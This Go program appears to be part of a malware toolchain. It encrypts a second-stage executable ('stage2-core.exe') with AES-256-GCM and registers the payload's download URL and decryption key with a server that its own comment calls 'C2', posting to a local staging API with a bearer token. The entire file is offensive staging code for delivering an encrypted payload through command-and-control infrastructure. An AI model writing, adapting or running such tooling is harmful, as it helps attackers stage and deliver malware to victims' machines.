package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

func main() {
	inputPath := "builds/stage2-core.exe"

	// Read stage2
	data, err := os.ReadFile(inputPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "read: %v\n", err)
		os.Exit(1)
	}

	// Generate AES-256 key
	key := make([]byte, 32)
	rand.Read(key)
	keyHex := hex.EncodeToString(key)

	// AES-GCM encrypt
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	encrypted := gcm.Seal(nonce, nonce, data, nil)

	// Write encrypted file
	outPath := "builds/stage2.enc"
	os.WriteFile(outPath, encrypted, 0644)
	fmt.Printf("Encrypted: %d bytes -> %s\n", len(encrypted), outPath)
	fmt.Printf("AES key: %s\n", keyHex)

	// Register with C2
	regData := map[string]string{
		"external_url": "http://169.254.243.30:8888/stage2.enc",
		"aes_key":      keyHex,
	}
	regJSON, _ := json.Marshal(regData)

	req, _ := http.NewRequest("POST", "http://127.0.0.1:8443/api/stage/register",
		bytes.NewReader(regJSON))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer test-api-key-1234567890abcdef")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Fprintf(os.Stderr, "register: %v\n", err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	json.NewDecoder(resp.Body).Decode(&result)
	fmt.Printf("Registered: %v\n", result["id"])
}
